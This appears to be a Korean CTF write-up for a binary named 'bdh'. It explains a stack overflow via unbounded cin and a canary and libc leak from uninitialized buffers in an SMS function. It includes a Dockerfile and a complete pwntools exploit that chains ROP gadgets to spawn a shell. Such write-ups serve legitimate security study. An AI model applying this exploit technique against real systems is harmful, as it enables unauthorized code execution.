코드를 좀 살펴본 결과 print_chices를 먼저 봐야한다는 것을 알 수 있다.

```cpp
	char nptr[264]; 
	...
	std::operator<<<std::char_traits<char>>(&std::cout, "> ");
	std::operator>><char,std::char_traits<char>>(&std::cin, nptr);
```

이렇게 되어 있기 때문에 버퍼 오버플로우가 발생한다. → 반환주소를 덮을 수 있다. 

출력이 없기 때문에 릭은 다른 곳에서 해야한다.

sms함수를 살펴본 결과,

```cpp
	  char buf[256]; // [rsp+40h] [rbp-210h] BYREF
	  char v13[264]; // [rsp+140h] [rbp-110h] BYREF
		...
		std::operator<<<std::char_traits<char>>(&std::cout, "Phone number: ");
    read(0, buf, 0xFFuLL);
    std::operator<<<std::char_traits<char>>(&std::cout, "Message: ");
    read(0, v13, 0xFFuLL);
```

이렇게 되어 있는 것을 알 수 있는데, 버퍼 오버플로우는 일어나지 않는다는 것을 알 수 있다.

하지만 디버깅으로 해당 버퍼들을 확인해본 결과 초기화가 되지 않아 유의미한 값들이 남아있는 것을 확인할 수 있었다. 이를 통해 libc base pie base, canary를 구할 수 있다.

이렇게 구한 값들로 ROP를 수행하면 익스할 수 있다.

도커 파일이 제공되지 않아 직접 작성했다.

```docker
FROM ubuntu:20.04@sha256:fd92c36d3cb9b1d027c4d2a72c6bf0125da82425fc2ca37c414d4f010180dc19

RUN apt-get update && apt-get install -y socat adduser

RUN adduser pwn -u 1001

WORKDIR /home/pwn

COPY ./bdh ./bdh

USER pwn

EXPOSE 8080

CMD socat TCP-LISTEN:8080,reuseaddr,fork EXEC:/home/pwn/bdh,stderr

# sudo docker run --rm --privileged -d --cap-add=SYS_PTRACE --security-opt seccomp=unconfined -p 8080:8080
```

```python
from pwn import *
import sys

e = ELF("./bdh")

context.binary = e

if len(sys.argv) == 3 :
    p = remote(sys.argv[1],sys.argv[2])

else :
    p = process([e.path])
    gdb.attach(p)

def Sms(phone, msg):
    p.sendlineafter(b"> ",b'3')
    p.sendafter(b": ",phone)
    p.sendafter(b": ",msg)

# pause()

Sms(b'a'*0xe9,b'a'*8)

p.recvuntil(b'a'*0xe9)
cnry = u64(b'\x00' + p.recvn(7))

p.recvuntil(b'a'*8)
leak = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,
b'\x00'))
libc_base = leak - 0x1ec980

system = 0x522ab + libc_base
binsh = 0x1b45bd + libc_base
pop_rdi = 0x0000000000023b6a + libc_base
info(f"{cnry:#x}")
info(f"{libc_base:#x}")
info(f"{system:#x}")
info(f"{binsh:#x}")
info(f"{pop_rdi:#x}")

payload = b'a'*0x108
payload += p64(cnry)
payload += b'b'*8
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

# pause()

p.sendlineafter(b"> ",payload)

p.interactive()
```
